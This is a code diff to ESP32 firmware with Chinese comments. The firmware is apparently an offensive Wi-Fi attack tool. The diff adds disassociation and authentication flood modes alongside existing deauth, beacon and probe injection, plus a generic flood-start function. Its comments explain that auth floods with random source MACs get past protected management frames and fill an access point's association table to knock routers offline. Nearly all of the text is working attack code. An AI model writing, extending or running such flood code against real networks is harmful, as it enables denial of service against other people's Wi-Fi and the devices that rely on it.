@@ -431,7 +431,16 @@ typedef enum {
     INJECT_DEAUTH,
     INJECT_BEACON,
     INJECT_PROBE,
+    INJECT_DISASSOC,
+    INJECT_AUTH,
 } inject_mode_t;
+
+/* flood 命令的帧类型选择 (与 CLI 字符串对应) */
+typedef enum {
+    FLOOD_DEAUTH = 0,
+    FLOOD_DISASSOC = 1,
+    FLOOD_AUTH = 2,
+} flood_type_t;
 
 typedef struct {
     inject_mode_t mode;
@@ -743,6 +752,23 @@ static void inject_task(void *pv)
                 int l2 = mk_deauth_frame(f2, a->bssid, a->sta, false, a->reason);
                 esp_wifi_80211_tx(WIFI_IF_STA, f2, l2, true);
             }
+        } else if (a->mode == INJECT_DISASSOC) {
+            bool broadcast = (a->sta[0]|a->sta[1]|a->sta[2]|a->sta[3]|a->sta[4]|a->sta[5]) == 0;
+            if (broadcast) {
+                uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
+                len = mk_disassoc_frame(frame, a->bssid, bc, true, a->reason);
+            } else {
+                len = mk_disassoc_frame(frame, a->bssid, a->sta, true, a->reason);
+                uint8_t f2[26];
+                int l2 = mk_disassoc_frame(f2, a->bssid, a->sta, false, a->reason);
+                esp_wifi_80211_tx(WIFI_IF_STA, f2, l2, true);
+            }
+        } else if (a->mode == INJECT_AUTH) {
+            /* auth flood: 每帧换随机源 MAC, 让 AP 为"新"客户端反复分配关联态.
+             * 不区分广播/定向: 目标固定是 AP (addr1/addr3=bssid), 源 MAC 恒随机. */
+            uint8_t fake[6];
+            fb_random_local_mac(fake);
+            len = mk_auth_frame(frame, a->bssid, fake);
         } else if (a->mode == INJECT_BEACON) {
             uint8_t src[6];
             /* 必须走 fb_random_local_mac: 裸 esp_fill_random 有一半概率把
@@ -1187,12 +1213,16 @@ static esp_err_t inject_start_common(inject_args_t *a)
     atomic_store(&s_inject_stop, false);
     atomic_store(&s_inject_total, 0);
     atomic_store(&s_state, WIFI_ATK_INJECT);
-    const char *mode_name = (a->mode == INJECT_DEAUTH) ? "deauth" :
-                            (a->mode == INJECT_BEACON) ? "beacon" : "probe";
+    const char *mode_name = (a->mode == INJECT_DEAUTH)   ? "deauth" :
+                            (a->mode == INJECT_DISASSOC) ? "disassoc" :
+                            (a->mode == INJECT_AUTH)     ? "auth" :
+                            (a->mode == INJECT_BEACON)   ? "beacon" : "probe";
     switch (a->mode) {
-        case INJECT_DEAUTH: rgb_led_set_status(RGB_INJECT_DEAUTH); break;
-        case INJECT_BEACON: rgb_led_set_status(RGB_INJECT_BEACON); break;
-        case INJECT_PROBE:  rgb_led_set_status(RGB_INJECT_PROBE);  break;
+        case INJECT_DEAUTH:   rgb_led_set_status(RGB_INJECT_DEAUTH); break;
+        case INJECT_DISASSOC: rgb_led_set_status(RGB_INJECT_DISASSOC); break;
+        case INJECT_AUTH:     rgb_led_set_status(RGB_INJECT_AUTH); break;
+        case INJECT_BEACON:   rgb_led_set_status(RGB_INJECT_BEACON); break;
+        case INJECT_PROBE:    rgb_led_set_status(RGB_INJECT_PROBE);  break;
     }
     /* 立即回执, 让 App 知道任务已启动 (在 cli 捕获窗口内, 会经 BLE 回传) */
     printf("META,WIFI,INJECT,START,mode,%s,count,%lu,interval,%lu,channel,%u\n",
@@ -1250,6 +1280,35 @@ esp_err_t wifi_attack_probe_flood_start(uint32_t count, uint32_t interval_ms)
     inject_args_t *a = calloc(1, sizeof(*a));
     ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
     a->mode = INJECT_PROBE;
+    a->count = count;
+    a->interval_ms = interval_ms;
+    return inject_start_common(a);
+}
+
+/* 通用洪泛: 选定帧类型对目标 AP 持续发送.
+ * ftype: FLOOD_DEAUTH / FLOOD_DISASSOC / FLOOD_AUTH.
+ *   - deauth/disassoc 属被保护管理帧, PMF 开启的 AP 丢弃, 广播踢人无效.
+ *   - auth 不是被保护管理帧, PMF 也照收; 每帧随机源 MAC 逼迫 AP 为"新"客户端
+ *     反复分配关联态, 关联表被打满或状态机被打崩即拒绝服务 (压垮路由器的实战向量).
+ * sta: 定向目标 (可为全 0 = 广播). auth 模式下 sta 被忽略, 源 MAC 恒随机.
+ * count=0 持续直到 wifi_attack_inject_stop / stop_all. */
+esp_err_t wifi_attack_flood_start(const uint8_t bssid[6], const uint8_t sta[6],
+                                 int ftype, uint32_t count, uint32_t interval_ms)
+{
+    if (!bssid) return ESP_ERR_INVALID_ARG;
+    inject_mode_t mode;
+    switch (ftype) {
+        case FLOOD_DISASSOC: mode = INJECT_DISASSOC; break;
+        case FLOOD_AUTH:     mode = INJECT_AUTH;     break;
+        case FLOOD_DEAUTH:
+        default:             mode = INJECT_DEAUTH;   break;
+    }
+    inject_args_t *a = calloc(1, sizeof(*a));
+    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
+    a->mode = mode;
+    memcpy(a->bssid, bssid, 6);
+    if (sta) memcpy(a->sta, sta, 6);   /* NULL/全0 = 广播 */
+    a->reason = 7;
     a->count = count;
     a->interval_ms = interval_ms;
     return inject_start_common(a);
